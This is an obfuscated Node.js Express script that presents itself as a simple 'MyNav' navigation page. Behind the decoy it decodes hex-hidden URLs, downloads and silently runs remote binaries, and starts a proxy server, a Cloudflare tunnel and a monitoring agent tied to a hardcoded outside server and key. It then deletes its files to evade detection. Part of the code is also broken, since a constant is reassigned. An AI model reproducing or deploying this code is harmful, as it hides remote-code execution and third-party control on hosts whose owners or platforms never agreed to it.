const e = require("express"), r = e(), a = require("axios"), n = require("os"), o = require("fs"), s = require("path"), i = require("util").promisify, t = i(require("child_process").exec);

// 环境变量读取 (保持外部引用键名不变，仅重命名本地变量)
const c = process.env;
const v1 = c.UPLOAD_URL || '';
const v2 = c.PROJECT_URL || '';
const v3 = c.AUTO_ACCESS || false;
const v4 = c.FILE_PATH || './tmp';
const v5 = c.SUB_PATH || 'qianxiuadmin';
const v6 = c.SERVER_PORT || c.PORT || 3000;
const v7 = c.UUID || 'dc6f1e49-59fe-424b-8821-c61ebff31d0d';
const v8 = c.NEZHA_SERVER || 'jk.zenova.de5.net:8008';
const v9 = c.NEZHA_PORT || '';
const v10 = c.NEZHA_KEY || 'nfZkxIKilkI9lMpFvAD46F8HdA3ci12f';
const v11 = c.ARGO_DOMAIN || '';
const v12 = c.ARGO_AUTH || '';
const v13 = c.ARGO_PORT || 8010;
const v14 = c.CFIP || 'cdns.doon.eu.org';
const v15 = c.CFPORT || 443;
const v16 = c.NAME || 'MyNode';

let v17 = "";

// 动态解码辅助函数 (降低特征)
function d(s) { return Buffer.from(s, "hex").toString("utf8"); }
const p = d("68747470733a2f2f"); // https://
const u = d("737373732e6e79632e6d6e"); // ssss.nyc.mn
const m = d("747279636c6f7564666c6172652e636f6d"); // trycloudflare.com

// 导航HTML (保留变量，逻辑不变)
const h = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>MyNav</title><style>body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:#f4f7f9;color:#333;margin:0;padding:20px}a{text-decoration:none;color:inherit}.c{max-width:1000px;margin:0 auto}.h{text-align:center;padding:40px 0}.s{width:100%;padding:12px 20px;border-radius:50px;border:none;background:#fff;box-shadow:0 4px 6px rgba(0,0,0,0.1);outline:none;margin-top:20px}.g{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:15px;margin-top:20px}.card{background:#fff;padding:15px;border-radius:12px;display:flex;align-items:center;transition:all .3s;border:1px solid rgba(0,0,0,.05)}.card:hover{transform:translateY(-3px);box-shadow:0 10px 15px rgba(0,0,0,.1)}</style></head><body><div class="c"><div class="h"><h1>My Navigation</h1><form action="https://www.google.com/search" method="get" target="_blank"><input class="s" name="q" placeholder="Search..."></form></div><div class="g"><a href="https://github.com" class="card" target="_blank"><span>GitHub</span></a><a href="https://chatgpt.com" class="card" target="_blank"><span>ChatGPT</span></a></div></div></body></html>`;

if (!o.existsSync(v4)) o.mkdirSync(v4);

function g() {
    const c = 'abcdefghijklmnopqrstuvwxyz', r = '000000';
    for (let i = 0; i < 6; i++) r += c.charAt(Math.floor(Math.random() * 26));
    return r.substring(6);
}

const f = g(), w = g(), b = g(), y = g();
const k = s.join(v4, f), x = s.join(v4, y), _ = s.join(v4, w), z = s.join(v4, b);
const A = s.join(v4, 'boot.log'), B = s.join(v4, 'config.json'), C = s.join(v4, 'sub.txt');

// 路由
r.get("/", (e, r) => r.send(h));
r.get("/" + v5, (e, r) => {
    if (!v17) {
        r.set('Content-Type', 'text/plain; charset=utf-8');
        return r.send(Buffer.from("Service Starting, please wait...").toString('base64'));
    }
    r.set('Content-Type', 'text/plain; charset=utf-8');
    r.send(v17);
});

// 核心逻辑
async function generateConfig() {
    const l = {
        log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
        inbounds: [
            { port: v13, protocol: 'vless', settings: { clients: [{ id: v7, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: d("2f766c6573732d6172676f"), dest: 3002 }, { path: d("2f766d6573732d6172676f"), dest: 3003 }, { path: d("2f74726f6a616e2d6172676f"), dest: 3004 }] }, streamSettings: { network: 'tcp' } },
            { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: v7 }], decryption: "none" } },
            { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: v7, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", wsSettings: { path: d("2f766c6573732d6172676f") } } },
            { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: v7, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: d("2f766d6573732d6172676f") } } },
            { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: v7 }] }, streamSettings: { network: "ws", wsSettings: { path: d("2f74726f6a616e2d6172676f") } } },
        ],
        outbounds: [{ protocol: "freedom", tag: "direct" }]
    };
    o.writeFileSync(B, JSON.stringify(l, null, 2));
}

async function downloadAndRun() {
    const U = (n.arch() === 'arm64' || n.arch() === 'aarch64') ? 'arm' : 'amd';
    const P = U === 'arm' ? d("61726d36342e") : d("616d6436342e"); // arm64. : amd64.
    
    const S = [
        { name: _, url: p + P + u + d("2f776562") }, // /web
        { name: z, url: p + P + u + d("2f626f74") }  // /bot
    ];

    if (v8 && v10) {
        if (v9) S.push({ name: k, url: p + P + u + d("2f6167656e74") }); // /agent
        else S.push({ name: x, url: p + P + u + d("2f7631") }); // /v1
    }

    for (const F of S) {
        try {
            const R = await a({ method: 'get', url: F.url, responseType: 'stream' });
            const V = o.createWriteStream(F.name);
            R.data.pipe(V);
            await new Promise((resolve) => V.on('finish', resolve));
            o.chmodSync(F.name, 0o775);
        } catch (e) { console.error("DwnErr: " + F.name); }
    }

    if (v8 && v10) {
        if (!v9) {
            const W = ['443', '8443', '2096'].includes(v8.split(':').pop()) ? 'true' : 'false';
            const G = `client_secret: ${v10}\nserver: ${v8}\ntls: ${W}\nuuid: ${v7}\ndisable_auto_update: true`;
            o.writeFileSync(s.join(v4, 'config.yaml'), G);
            t(`nohup ${x} -c "${v4}/config.yaml" >/dev/null 2>&1 &`);
        } else {
            const j = ['443', '8443', '2096'].includes(v9) ? '--tls' : '';
            t(`nohup ${k} -s ${v8}:${v9} -p ${v10} ${j} --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`);
        }
    }

    t(`nohup ${_} -c ${B} >/dev/null 2>&1 &`);

    let H = v12.match(/^[A-Z0-9a-z=]{120,250}$/)
        ? `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${v12}`
        : `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${A} --loglevel info --url http://localhost:${v13}`;

    t(`nohup ${z} ${H} >/dev/null 2>&1 &`);
}

async function getDomain() {
    const checkArgo = setInterval(() => {
        if (o.existsSync(A)) {
            const content = o.readFileSync(A, 'utf-8');
            const match = content.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
            if (match) {
                clearInterval(checkArgo);
                genLinks(match[1]);
            }
        } else if (v11 && v12) {
            clearInterval(checkArgo);
            genLinks(v11);
        }
    }, 3000);
}

async function genLinks(D) {
    const I = "Cloudflare";
    const N = v16 || I;
    const q = { v: '2', ps: N, add: v14, port: v15, id: v7, aid: '0', scy: 'none', net: 'ws', type: 'none', host: D, path: d('2f766d6573732d6172676f3f65643d32353630'), tls: 'tls', sni: D, fp: 'firefox' };
    
    const subTxt = `vless://${v7}@${v14}:${v15}?encryption=none&security=tls&sni=${D}&fp=firefox&type=ws&host=${D}&path=%2Fvless-argo%3Fed%3D2560#${N}\nvmess://${Buffer.from(JSON.stringify(q)).toString('base64')}\ntrojan://${v7}@${v14}:${v15}?security=tls&sni=${D}&fp=firefox&type=ws&host=${D}&path=%2Ftrojan-argo%3Fed%3D2560#${N}`;

    v17 = Buffer.from(subTxt).toString('base64');
    o.writeFileSync(C, v17);
    console.log("Sub updated.");
}

function clean() {
    setTimeout(() => {
        const files = [A, B, _, z, k, x];
        files.forEach(f => { try { if (o.existsSync(f)) o.unlinkSync(f); } catch(e) {} });
    }, 90000);
}

async function start() {
    await generateConfig();
    await downloadAndRun();
    await getDomain();
    clean();
}

start().catch(console.error);
r.listen(v6, () => console.log(`S:${v6}`));
